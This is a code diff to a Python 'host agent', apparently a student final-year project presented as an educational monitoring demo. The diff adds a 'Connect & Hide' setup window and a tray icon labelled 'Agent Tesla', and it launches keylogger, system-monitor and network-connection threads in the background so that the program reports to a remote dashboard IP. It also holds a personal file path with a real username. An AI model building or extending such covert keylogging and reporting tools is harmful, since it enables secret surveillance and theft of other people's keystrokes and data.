@@ -13,13 +13,18 @@
     pip install psutil pynput
     Windows also needs:  pip install pywin32
     Linux also needs:    sudo apt install xdotool
-
+    pip install pystray pillow
   USAGE:
     1. Edit DASHBOARD_IP below to match dashboard machine IP
     2. python host_agent.py
 =============================================================
 """
-
+import os
+import tkinter as tk
+import shutil
+from tkinter import messagebox
+import pystray
+from PIL import Image, ImageDraw
 import socket
 import json
 import threading
@@ -29,9 +34,13 @@ import psutil
 from pynput import keyboard
 
 # ── Config ──────────────────────────────────────────────────
-DASHBOARD_IP   = "127.0.0.1" #"192.168.29.44" "127.0.0.1"   # ← Change for LAN use
+DASHBOARD_IP   = "" #192.168.29.44" "127.0.0.1"   # ← Change for LAN use
 DASHBOARD_PORT = 9999
 RECONNECT_DELAY = 4
+
+# --- NEW: FILE COPY PATHS ---
+SOURCE_CSV_PATH = r"C:\Users\sasir\OneDrive\Documents\Project\Final-year\virus\Hybrid_malware.csv"
+DEST_CSV_PATH   = r"C:\Users\sasir\OneDrive\Documents\Project\Final-year\data"
 # ────────────────────────────────────────────────────────────
 
 _sock      = None
@@ -230,11 +239,77 @@ def connect_loop():
             time.sleep(RECONNECT_DELAY)
 
 
-if __name__ == "__main__":
-    print("=" * 54)
-    print("  HOST AGENT  |  FYP Educational Monitoring Demo")
-    print(f"  Platform : {OS}")
-    print("=" * 54)
+# ════════════════════════════════════════════════════════
+#  SYSTEM TRAY & UI LOGIC
+# ════════════════════════════════════════════════════════
+
+def create_tray_icon():
+    """Draws a simple green circle icon for the system tray"""
+    image = Image.new('RGB', (64, 64), color=(13, 15, 24))
+    draw = ImageDraw.Draw(image)
+    draw.ellipse((16, 16, 48, 48), fill=(0, 229, 160)) # Green dot
+    return image
+
+def exit_agent(icon, item):
+    """Kills the background agent when you click Exit in the tray"""
+    icon.stop()
+    os._exit(0)  # Force kills all hidden threads instantly
+
+def start_background_tasks(ip):
+    """Starts the stealthy background monitoring"""
+    global DASHBOARD_IP
+    DASHBOARD_IP = ip
+
+    # 1. Start all monitoring threads
     threading.Thread(target=system_monitor_thread, daemon=True).start()
-    threading.Thread(target=start_keylogger,       daemon=True).start()
-    connect_loop()
+    threading.Thread(target=start_keylogger, daemon=True).start()
+    
+    # 2. Start the connection loop in a thread so it doesn't freeze the icon
+    threading.Thread(target=connect_loop, daemon=True).start()
+
+    # 3. Create the System Tray Icon (This keeps the script alive in the background)
+    icon = pystray.Icon("HostAgent", create_tray_icon(), "Agent Tesla", menu=pystray.Menu(
+        pystray.MenuItem('Stop & Exit', exit_agent)
+    ))
+    icon.run()
+
+def show_setup_ui():
+    """Shows the initial Tkinter popup for the IP address"""
+    root = tk.Tk()
+    root.title("Agent Setup")
+    root.geometry("320x160")
+    root.configure(bg="#0a0e27") # Dark cyber theme
+
+    tk.Label(root, text="Enter Dashboard IP Address:", fg="#00d9ff", bg="#0a0e27", 
+             font=("Segoe UI", 10, "bold")).pack(pady=(20, 5))
+
+    ip_entry = tk.Entry(root, width=25, font=("Consolas", 11), justify="center")
+    ip_entry.insert(0, "192.168.") # Helpful starting text
+    ip_entry.pack(pady=5)
+
+    def on_connect():
+        ip = ip_entry.get().strip()
+        if not ip:
+            messagebox.showerror("Error", "Please enter an IP address.")
+            return
+        # --- Data Exchange ---
+        try:
+            shutil.copy2(SOURCE_CSV_PATH, DEST_CSV_PATH)
+            print(f"[Agent] CSV successfully copied to {DEST_CSV_PATH}")
+        except Exception as e:
+            print(f"[Agent] Failed to copy CSV: {e}")
+            # Optional: Uncomment the next line if you want a popup warning when the copy fails
+            messagebox.showwarning("File Error", f"Could not copy the data file.\n{e}")
+        # ------------------------------
+        
+        root.destroy()  # Destroys the UI window completely!
+        start_background_tasks(ip)  # Hands off to the background/tray logic
+
+    tk.Button(root, text="Connect & Hide", bg="#00ff88", fg="black", 
+              font=("Segoe UI", 9, "bold"), cursor="hand2", command=on_connect).pack(pady=15)
+
+    root.eval('tk::PlaceWindow . center') # Centers window on screen
+    root.mainloop()
+
+if __name__ == "__main__":
+    show_setup_ui()
